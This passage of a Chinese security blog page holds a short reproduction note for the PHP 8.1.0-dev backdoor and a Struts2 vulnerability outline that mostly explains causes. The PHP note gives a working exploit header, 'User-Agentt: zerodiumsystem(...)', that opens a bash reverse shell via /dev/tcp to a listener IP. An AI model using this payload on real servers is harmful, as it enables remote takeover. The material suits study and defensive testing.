+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/PHP/php8.1.html" class="post-title-link" itemprop="url">Php8.1backdoor</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-17 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-17T15:56:49+08:00">2022-07-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 09:59:41" itemprop="dateModified" datetime="2023-04-16T09:59:41+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index"><span itemprop="name">高级语言</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="PHP8-1后门漏洞">1. PHP8.1后门漏洞</h1><h2 id="影响版本">1.1. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP 8.1.0-dev</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络测绘">1.2. 网络测绘:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;PHP/8.1.0-dev&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">1.3. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumvar_dump(3*7);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/17/aLZYTRXxgbM38Im.png" alt="image-20220717173108649"></p>
+<h2 id="漏洞利用">1.4. 漏洞利用:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求头增加下列数据</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.179.129/9999 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/17/ivMWj4CTebIhfpn.png" alt="image-20220717174749390"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Struts2.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Struts2.html" class="post-title-link" itemprop="url">Struts2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-13 14:06:53" itemprop="dateCreated datePublished" datetime="2022-07-13T14:06:53+08:00">2022-07-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:27:08" itemprop="dateModified" datetime="2023-04-16T10:27:08+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="s2-005">1. s2-005</h1><h4 id="漏洞原理">1.0.0.1. 漏洞原理:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Struts2 标签中 &#x27;&lt;s:a&gt;&#x27; 和 &#x27;&lt;s:url&gt;&#x27; 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：</span><br><span class="line"></span><br><span class="line">1. none - 链接不包含请求的任意参数值（默认）</span><br><span class="line">2. get - 链接只包含 GET 请求中的参数和其值</span><br><span class="line">3. all - 链接包含 GET 和 POST 所有参数和其值</span><br><span class="line"></span><br><span class="line">&#x27;&lt;s:a&gt;&#x27;用来显示一个超链接，当&#x27;includeParams=all&#x27;的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-007">2. s2-007</h1><h1 id="s2-008">3. s2-008</h1><h1 id="s2-009">4. s2-009</h1><h1 id="s2-012">5. s2-012</h1><h1 id="s2-013">6. s2-013</h1><h1 id="s2-015">7. s2-015</h1><h1 id="s2-016">8. s2-016</h1><h2 id="漏洞原理-1">8.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、&quot;redirect:&quot;、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-045">9. s2-045</h1><h2 id="漏洞原理-2">9.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行。</span><br><span class="line">实际上在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell（另外原本其实也有第三种选择cos）。其中的jakarta解析器是Struts 2框架的标准组成部分。默认情况下jakarta是启用的，所以该漏洞的严重性需要得到正视。</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-046">10. s2-046</h1><h2 id="漏洞原理-3">10.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行。该漏洞与S2-045 (CVE-2017-5638)相似，但使用了不同的攻击向量。</span><br><span class="line"></span><br><span class="line">JakartaStreamMultipartRequest已开启。也就是说，Struts2需要通过Jakarta stream parser配置（非默认）。在Struts2配置文件中检查&lt;constant name=”struts.multipart.parser” value=”jakarta-stream” /&gt;</span><br><span class="line">上传的文件大小根据Content-Length头的声明要大于Struts2默认允许的2GB大小</span><br><span class="line">文件名中包含OGNL payload</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-052">11. s2-052</h1><h2 id="漏洞原理-4">11.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache 官方发布 Struts 2 紧急漏洞公告（S2-052），CVE 编号CVE-2017-9805。公告中披露，Struts2 REST插件的XStream组件存在反序列化漏洞，导致远程代码执行。攻击者利用此漏洞可执行任意代码，创建/删除系统账号，修改任意文件，植入后门等</span><br></pre></td></tr></table></figure>
+
+<h1 id="s2-053">12. s2-053</h1><h1 id="s2-057">13. s2-057</h1><h1 id="s2-059">14. s2-059</h1><h1 id="s2-061">15. s2-061</h1>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="气温太低"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">气温太低</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">气温太低</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+    </div>
+</body>
+</html>
